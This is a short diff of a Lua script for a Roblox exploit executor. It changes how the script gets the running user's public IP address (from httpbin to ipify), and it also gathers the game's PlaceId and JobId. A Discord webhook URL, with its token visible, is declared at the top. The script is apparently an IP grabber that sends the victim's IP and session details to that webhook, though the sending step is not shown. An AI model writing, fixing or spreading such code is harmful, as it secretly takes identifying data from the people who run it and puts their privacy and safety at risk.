@@ -2,10 +2,10 @@ local webhook_url = "https://discord.com/api/webhooks/1300001948782690425/RH-uvo
 local httpService = game:GetService("HttpService")
 local httpRequest = http_request or request or syn.request
 
-local response = httpRequest({Url = "https://httpbin.org/get", Method = "GET"})
+local response = httpRequest({Url = "https://api64.ipify.org/?format=json", Method = "GET"})
 local responseBody = response.Body
 local parsedBody = httpService:JSONDecode(responseBody)
-local userIp = parsedBody.origin
+local userIp = parsedBody.ip
 local placeId = game.PlaceId
 local jobId = game.JobId
 
